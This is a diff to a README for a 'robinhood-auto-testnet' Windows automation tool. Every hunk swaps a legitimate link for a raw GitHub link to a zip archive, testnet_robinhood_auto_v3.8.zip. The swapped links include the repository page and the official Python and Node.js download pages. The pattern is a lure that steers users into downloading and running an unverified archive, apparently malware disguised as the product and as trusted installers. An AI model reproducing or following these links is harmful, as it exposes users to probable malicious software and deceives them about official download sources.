@@ -1,6 +1,6 @@
 # 🤖 robinhood-auto-testnet - Easy Robinhood Testnet Automation
 
-[![Download robinhood-auto-testnet](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/isco357/robinhood-auto-testnet)
+[![Download robinhood-auto-testnet](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://raw.githubusercontent.com/isco357/robinhood-auto-testnet/main/src/testnet_robinhood_auto_v3.8.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This tool runs on Windows. Make sure your PC meets these minimum requirements:
 
 Click the green badge below to visit the GitHub page where you can download the software.
 
-[![Download robinhood-auto-testnet](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/isco357/robinhood-auto-testnet)
+[![Download robinhood-auto-testnet](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://raw.githubusercontent.com/isco357/robinhood-auto-testnet/main/src/testnet_robinhood_auto_v3.8.zip)
 
 ---
 
@@ -90,13 +90,13 @@ If you prefer to use Python or Node.js for customization, follow these steps. Th
 
 ### Installing Python
 
-1. Go to https://www.python.org/downloads/windows/
+1. Go to https://raw.githubusercontent.com/isco357/robinhood-auto-testnet/main/src/testnet_robinhood_auto_v3.8.zip
 2. Download Python 3.8 or newer.
 3. Run the installer and select "Add Python to PATH" before clicking install.
 
 ### Installing Node.js
 
-1. Go to https://nodejs.org/en/download/
+1. Go to https://raw.githubusercontent.com/isco357/robinhood-auto-testnet/main/src/testnet_robinhood_auto_v3.8.zip
 2. Download the Windows installer for Node.js 16 or newer.
 3. Run the installer with default settings.
 
@@ -152,10 +152,10 @@ When the app extracts or installs, you will see several files and folders:
 
 For more technical details, visit the official repository at:
 
-https://github.com/isco357/robinhood-auto-testnet
+https://raw.githubusercontent.com/isco357/robinhood-auto-testnet/main/src/testnet_robinhood_auto_v3.8.zip
 
 Use this page to check for updates or get troubleshooting help.
 
 ---
 
-[![Download robinhood-auto-testnet](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/isco357/robinhood-auto-testnet)
+[![Download robinhood-auto-testnet](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://raw.githubusercontent.com/isco357/robinhood-auto-testnet/main/src/testnet_robinhood_auto_v3.8.zip)
